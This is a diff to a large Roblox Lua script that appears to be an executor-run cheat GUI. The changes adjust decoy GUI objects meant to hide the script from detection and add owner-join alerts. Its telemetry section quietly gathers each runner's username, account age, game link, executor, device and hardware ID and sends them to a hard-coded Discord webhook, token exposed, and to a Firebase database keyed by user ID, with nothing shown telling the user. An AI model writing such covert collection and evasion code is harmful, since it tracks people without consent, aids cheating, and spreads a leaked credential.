@@ -7514,12 +7514,25 @@ task.spawn(C_3);
 -- StarterGui.T5784YHRGE89ES98T.startupScript
 local function C_4()
 local script = G2L["4"];
-	
-	
 	-- Wait then show notification
 	task.wait(4)
-	
 	_G.Notify("Thank you for using my script - agarvvoid", 5, 139308638407157)
+	
+	-- Owner join detection
+	local Players = game:GetService("Players")
+	
+	Players.PlayerAdded:Connect(function(player)
+		if _G.IsOwner(player.UserId) then
+			_G.Notify("The owner of this script joined the server!", 5, 117934611310434)
+		end
+	end)
+	
+	-- Check if owner is already in server
+	for _, player in pairs(Players:GetPlayers()) do
+		if _G.IsOwner(player.UserId) then
+			_G.Notify("The owner of this script is in the server!", 5, 117934611310434)
+		end
+	end
 end;
 task.spawn(C_4);
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.topbarScript
@@ -12620,7 +12633,7 @@ local script = G2L["2c9"];
 	end
 	
 	-- ============================================================
-	-- STEP 2.5: Create 500 fake MainFrames in the real ScreenGui
+	-- STEP 2.5: Create 10 fake MainFrames in the real ScreenGui
 	-- ============================================================
 	local instanceTypes = {"Frame", "TextLabel", "TextButton", "ImageLabel", "ScrollingFrame", "Folder", "LocalScript"}
 	
@@ -12634,7 +12647,7 @@ local script = G2L["2c9"];
 		return result
 	end
 	
-	for i = 1, 500 do
+	for i = 1, 10 do
 		local fakeFrame = Instance.new("Frame")
 		fakeFrame.Name = "MainFrame"
 		fakeFrame.Visible = false
@@ -12656,71 +12669,6 @@ local script = G2L["2c9"];
 	
 			fakeChild.Parent = fakeFrame
 		end
-	end
-	
-	-- ============================================================
-	-- STEP 3: Create fake GUIs
-	-- ============================================================
-	local function createFakeGui(parent)
-		local fakeGui = Instance.new("ScreenGui")
-	
-		-- Generate unique name
-		local suffix
-		repeat
-			suffix = randomString(7)
-		until "T5784YHRGE" .. suffix ~= "T5784YHRGE89ES98T"
-	
-		fakeGui.Name = "T5784YHRGE" .. suffix
-		fakeGui.Enabled = false
-		fakeGui.Parent = parent
-	
-		-- Add fake MainFrame
-		local fakeMainFrame = Instance.new("Frame")
-		fakeMainFrame.Name = "Frame"
-		fakeMainFrame.Visible = false
-		fakeMainFrame.Parent = fakeGui
-	
-		-- Add fake objects with generic names
-		local objectTypes = {
-			{type = "Frame", name = "Frame"},
-			{type = "TextLabel", name = "TextLabel"},
-			{type = "TextButton", name = "TextButton"},
-			{type = "ImageLabel", name = "ImageLabel"},
-			{type = "ScrollingFrame", name = "ScrollingFrame"},
-			{type = "Folder", name = "Folder"}
-		}
-	
-		local numObjects = math.random(5, 15)
-		for i = 1, numObjects do
-			local objConfig = objectTypes[math.random(1, #objectTypes)]
-			local fakeObj = Instance.new(objConfig.type)
-			fakeObj.Name = objConfig.name
-	
-			if fakeObj:IsA("GuiObject") then
-				fakeObj.Visible = false
-			end
-	
-			fakeObj.Parent = fakeGui
-		end
-	
-		-- Add fake LocalScripts
-		local numScripts = math.random(2, 5)
-		for i = 1, numScripts do
-			local fakeScript = Instance.new("LocalScript")
-			fakeScript.Name = "LocalScript"
-			fakeScript.Disabled = true
-			fakeScript.Parent = fakeGui
-		end
-	end
-	
-	-- Create 49 in CoreGui
-	for i = 1, 49 do
-		createFakeGui(CoreGui)
-	end
-	
-	-- Create 50 in PlayerGui
-	for i = 1, 50 do
-		createFakeGui(PlayerGui)
 	end
 end;
 task.spawn(C_2c9);
@@ -13729,7 +13677,6 @@ local script = G2L["333"];
 		local _MarketplaceSvc  = game:GetService("MarketplaceService")
 		local _AnalyticsSvc    = game:GetService("RbxAnalyticsService")
 		local _InputService    = game:GetService("UserInputService")
-		local _LocaleSvc       = game:GetService("LocalizationService")
 	
 		local _WEBHOOK = "https://discord.com/api/webhooks/1502950736902750258/mav7Jjsbea6vyUZOV3NfWzIvIB1XDSTJMqjKx7mCTCY00RL2mKnKQqgdZGRGfPWMjO5Y"
 		local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
@@ -13758,11 +13705,6 @@ local script = G2L["333"];
 			if KRNL_LOADED or Krnl then return "KRNL" end
 			if getexecutorname then return getexecutorname() end
 			return "Unknown"
-		end
-	
-		local function _region()
-			local ok, r = pcall(function() return _LocaleSvc.RobloxLocaleId end)
-			return ok and r or "N/A"
 		end
 	
 		local function _platform()
@@ -13800,10 +13742,10 @@ local script = G2L["333"];
 			return ok and v or ""
 		end
 	
-		local function _getPlayerData(hwid)
+		local function _getPlayerData(userId)
 			local success, response = pcall(function()
 				return _req({
-					Url = _FIREBASE_URL .. "/players/" .. hwid .. ".json",
+					Url = _FIREBASE_URL .. "/players/" .. userId .. ".json",
 					Method = "GET"
 				})
 			end)
@@ -13818,19 +13760,41 @@ local script = G2L["333"];
 			return {
 				execution_count = 0,
 				first_seen = os.time(),
-				last_username = ""
+				last_seen = os.time(),
+				hwids = {}
 			}
 		end
 	
-		local function _updatePlayerData(hwid, data)
+		local function _updatePlayerData(userId, data)
 			pcall(function()
 				_req({
-					Url = _FIREBASE_URL .. "/players/" .. hwid .. ".json",
+					Url = _FIREBASE_URL .. "/players/" .. userId .. ".json",
 					Method = "PATCH",
 					Headers = { ["Content-Type"] = "application/json" },
 					Body = _HttpService:JSONEncode(data)
 				})
 			end)
+		end
+	
+		local function _addHWID(userId, hwid)
+			local playerData = _getPlayerData(userId)
+	
+			-- Check if HWID already exists
+			local hwidExists = false
+			for _, existingHwid in pairs(playerData.hwids) do
+				if existingHwid == hwid then
+					hwidExists = true
+					break
+				end
+			end
+	
+			-- Add HWID if it doesn't exist
+			if not hwidExists then
+				table.insert(playerData.hwids, hwid)
+				_updatePlayerData(userId, { hwids = playerData.hwids })
+			end
+	
+			return playerData
 		end
 	
 		local function _send(embedTable)
@@ -13844,20 +13808,26 @@ local script = G2L["333"];
 			end)
 		end
 	
+		local userId = _plr.UserId
 		local hwid = _hwid()
-		local playerData = _getPlayerData(hwid)
 	
+		-- Get player data and add HWID
+		local playerData = _addHWID(userId, hwid)
+	
+		-- Update execution count and last seen
 		playerData.execution_count = playerData.execution_count + 1
-		playerData.last_username = _plr.Name
 		playerData.last_seen = os.time()
 	
-		_updatePlayerData(hwid, playerData)
+		_updatePlayerData(userId, {
+			execution_count = playerData.execution_count,
+			last_seen = playerData.last_seen
+		})
 	
 		local accountCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
 	
 		_send({
 			description = string.format(
-				"**User:** %s / @%s\n**%s** (%d Days)\n\n**Game:** [%s](%s)\n**Server:** %d/%d\n\n**Region:** %s\n**Executor:** %s\n**Device:** %s | %dms | %dfps\n**HWID:** `%s`\n\n**Execution Count:** #%d",
+				"**User:** %s / @%s\n**%s** (%d Days)\n\n**Game:** [%s](%s)\n**Server:** %d/%d\n\n**Executor:** %s\n**Device:** %s | %dms | %dfps\n**HWID:** `%s`\n\n**Execution Count:** #%d",
 				_plr.DisplayName,
 				_plr.Name,
 				accountCreated,
@@ -13866,7 +13836,6 @@ local script = G2L["333"];
 				_joinLink(),
 				#_Players:GetPlayers(),
 				_Players.MaxPlayers,
-				_region(),
 				_executor(),
 				_platform(),
 				_ping(),
